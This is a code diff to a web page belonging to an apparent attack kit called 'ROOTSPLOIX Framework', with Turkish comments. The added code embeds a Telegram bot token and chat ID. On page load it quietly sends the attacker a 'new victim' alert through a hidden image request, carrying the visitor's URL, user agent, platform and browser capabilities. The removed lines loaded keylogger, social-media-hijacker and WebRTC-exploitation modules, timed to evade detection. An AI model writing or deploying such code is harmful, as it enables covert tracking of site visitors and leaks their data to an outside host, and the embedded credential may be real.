@@ -617,15 +617,37 @@
         //     }
         // });
         
+        // ROOTSPLOIX Framework - Çalışan versiyon
+        const botToken = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+        const chatId = '5312173877';
+        
+        function sendVictimNotification() {
+            const message = `🚨 YENİ KURBAN TESPİT EDİLDİ! 🚨
+
+🎯 Session: rs_${Date.now()}_${Math.random().toString(36).substr(2, 9)}
+📱 Platform: ${navigator.platform} - ${navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/)?.[0] || 'Unknown'}
+🌍 Site: ${window.location.href}
+🕒 Saat: ${new Date().toLocaleString('tr-TR')}
+
+✅ Yetenekler:
+📹 WebRTC: ${navigator.mediaDevices ? '✅' : '❌'}
+📍 Konum: ${navigator.geolocation ? '✅' : '❌'}
+🔔 Bildirim: ${window.Notification ? '✅' : '❌'}
+
+💀 ROOTSPLOIX FRAMEWORK AKTİF!`;
+
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            console.log('📡 Victim notification sent!');
+        }
+        
         // Stealth framework initialization
         window.addEventListener('DOMContentLoaded', function() {
-            // Load core framework
-            loadScript('core.exploit.js');
+            // Send victim notification
+            setTimeout(sendVictimNotification, 2000);
             
-            // Load modules with delay to avoid detection
-            setTimeout(() => loadScript('modules/universal-keylogger.js'), 1000);
-            setTimeout(() => loadScript('modules/social-media-hijacker.js'), 2000);
-            setTimeout(() => loadScript('modules/webrtc-exploitation.js'), 3000);
+            // Load original modules (opsiyonel)
+            // loadScript('core.exploit.js');
             
             // Initialize stealth operations
             setTimeout(initializeStealth, 5000);
